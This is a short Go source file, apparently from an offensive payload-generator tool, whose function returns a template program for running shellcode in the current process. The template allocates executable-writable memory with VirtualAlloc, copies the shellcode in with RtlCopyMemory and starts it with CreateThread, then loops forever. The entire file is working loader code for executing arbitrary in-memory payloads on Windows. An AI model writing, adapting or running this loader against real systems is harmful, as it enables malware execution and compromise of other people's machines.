package loaders

import (
	"fmt"
)

func GetCreateThreadTemplate(targetProcess string) string {
	var _ = targetProcess // unused in this template

	println("\n\n[!] PLEASE NOTE: shellcode will not be injected into new process with this method")
	return fmt.Sprintf(`
package main

import (
	"syscall"
	"unsafe"
    "time"
)

const (
	MEM_COMMIT             = 0x1000
	MEM_RESERVE            = 0x2000
	PAGE_EXECUTE_READWRITE = 0x40
)

var (
	kernel32        = syscall.MustLoadDLL("kernel32.dll")
	ntdll           = syscall.MustLoadDLL("ntdll.dll")

	VirtualAlloc    = kernel32.MustFindProc("VirtualAlloc")
	RtlCopyMemory   = ntdll.MustFindProc("RtlCopyMemory")
	CreateThread    = kernel32.MustFindProc("CreateThread")
)

func ExecuteOrderSixtySix(shellcode []byte) {

	addr, _, _ := VirtualAlloc.Call(
		0,
		uintptr(len(shellcode)),
		MEM_COMMIT|MEM_RESERVE, PAGE_EXECUTE_READWRITE,
	)

	_, _, _ = RtlCopyMemory.Call(
		addr,
		(uintptr)(unsafe.Pointer(&shellcode[0])),
		uintptr(len(shellcode)),
	)

	_, _, _ = CreateThread.Call(
		0,
		0,
		addr,
		0,
		0,
		0,
	)

    /*
        FIXME(djnn): it seems that we cant use select instead at
        the risk of a deadlock, which kind of sucks

        instead, let's just wait manually like this xD (which also sucks)
    */
    for {
        time.Sleep(100 * time.Second)
    }
}
    `)
}
